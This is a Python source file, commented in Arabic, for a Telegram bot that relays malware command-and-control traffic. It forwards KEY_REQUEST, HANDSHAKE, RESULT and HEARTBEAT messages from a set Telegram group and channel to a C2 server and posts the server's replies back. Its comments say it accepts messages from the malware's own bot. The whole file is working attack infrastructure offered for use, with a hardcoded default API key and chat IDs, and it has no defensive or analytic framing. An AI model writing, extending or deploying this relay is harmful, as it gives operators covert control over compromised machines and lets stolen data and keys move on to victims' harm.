"""
C2 Telegram Relay Bot — وسيط فقط
================================
لا يستقبل أوامر من البشر ولا من الخاص.

• الداشبورد / السيرفر يبعتوا للشات عبر c2_server مباشرة (HTTP → Telegram API).
• هذا البوت يعمل polling للجروب المحدد وللقناة (البوت لازم يكون أدمن في القناة).
• في الجروب: يمرّر رسائل البروتوكول القادمة من *بوت* أو من *منشور القناة المنسوخ للمناقشة*.
"""

import sys
import os

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import json
import requests
from telegram import Update
from telegram.constants import ChatType
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes

# ── Config ────────────────────────────────────────────────────────────
BASE_DIR        = os.path.dirname(os.path.abspath(__file__))
TELEGRAM_CONFIG = os.path.join(BASE_DIR, "telegram_config.json")
C2_URL          = os.environ.get("C2_SERVER_URL", "http://localhost:5000")
C2_KEY          = os.environ.get("C2_API_KEY", "c2_super_secret_key_2026_123456")
C2_HEADERS      = {"X-API-Key": C2_KEY, "Content-Type": "application/json"}

C2_GROUP_ID     = "-1002470378114"
C2_CHANNEL_ID   = "-1002426552780"
_C2_PREFIXES    = ("KEY_REQUEST:", "HANDSHAKE:", "RESULT:", "HEARTBEAT:")


def _load_token() -> str:
    try:
        if os.path.exists(TELEGRAM_CONFIG):
            with open(TELEGRAM_CONFIG, "r", encoding="utf-8") as f:
                cfg = json.load(f)
            token = cfg.get("token", "").strip()
            if token:
                print(f"✅ Token loaded from {TELEGRAM_CONFIG}")
                return token
    except Exception as e:
        print(f"⚠️  Could not load telegram_config.json: {e}")
    return os.environ.get("TELEGRAM_BOT_TOKEN", "")


def _allowed_protocol_sender(update: Update) -> bool:
    """
    في الجروب: قبول من بوت المالوير، أو منشور القناة في مجموعة المناقشة
    (sender_chat = قناة / is_automatic_forward).
    """
    msg = update.effective_message
    if not msg:
        return False
    user = update.effective_user
    if user is not None and user.is_bot:
        return True
    sc = getattr(msg, "sender_chat", None)
    if sc is not None:
        try:
            if sc.type == ChatType.CHANNEL:
                return True
        except Exception:
            pass
        if getattr(sc, "type", None) == "channel":
            return True
    if getattr(msg, "is_automatic_forward", False):
        return True
    return False


async def handle_c2_protocol(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """جروب مناقشة أو القناة → يمرّر نص البروتوكول إلى C2."""
    msg = update.effective_message
    if not msg or not msg.text:
        return

    cid = str(msg.chat.id)

    if cid == C2_GROUP_ID:
        if not _allowed_protocol_sender(update):
            return
    elif cid != C2_CHANNEL_ID:
        return

    text = msg.text.strip()
    if not any(text.startswith(p) for p in _C2_PREFIXES):
        return

    try:
        r = requests.post(
            f"{C2_URL}/internal/tg_message",
            json={"text": text},
            headers=C2_HEADERS,
            timeout=10,
        )
        reply = r.json().get("reply")
        if reply:
            await context.bot.send_message(chat_id=int(C2_CHANNEL_ID), text=reply)
    except Exception as e:
        print(f"[C2 protocol handler] error: {e}")


async def error_handler(update, context):
    print(f"GLOBAL ERROR: {context.error}")


if __name__ == "__main__":
    TOKEN = _load_token()
    if not TOKEN:
        print("❌ No bot token found!")
        print("   Add the token via the Dashboard → Telegram page, then restart bot.py")
        sys.exit(1)

    app = (
        ApplicationBuilder()
        .token(TOKEN)
        .connect_timeout(30)
        .read_timeout(30)
        .build()
    )

    # القناة: KEY_REQUEST وغيره يصل كـ channel_post إذا كان البوت أدمن في القناة
    app.add_handler(
        MessageHandler(
            filters.TEXT & filters.Chat(chat_id=int(C2_CHANNEL_ID)),
            handle_c2_protocol,
        )
    )
    # الجروب (أو مجموعة مناقشة القناة): يقبل مرسل بوت أو منشور القناة المعاد
    app.add_handler(
        MessageHandler(
            filters.TEXT & filters.Chat(chat_id=int(C2_GROUP_ID)),
            handle_c2_protocol,
        )
    )
    app.add_error_handler(error_handler)

    print("🤖 C2 Relay — جروب + قناة، بروتوكول من بوت / قناة مرتبطة فقط في الجروب")
    print(f"   C2 Server: {C2_URL}")
    app.run_polling()
